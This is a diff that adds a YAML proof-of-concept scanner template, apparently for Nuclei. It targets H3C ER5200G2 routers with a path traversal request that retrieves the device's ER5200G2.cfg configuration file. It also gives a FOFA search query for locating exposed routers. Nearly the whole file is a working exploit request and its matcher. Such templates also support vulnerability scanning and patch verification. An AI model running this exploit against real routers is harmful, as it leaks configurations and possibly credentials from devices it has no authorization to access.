@@ -1,0 +1,27 @@
+id: poc-mn79eokfg15o471g
+info:
+  name: H3C-ER5200G2系列ER5200G2.cfg存在路径穿越导致信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mn79eokfg15o471g'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mn79eokfg15o471g
+    fofa: app="H3C-Ent-Router" && title=="ER5200G2系统管理"
+http:
+- raw:
+  - 'GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; CrOS aarch64 15236.9.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
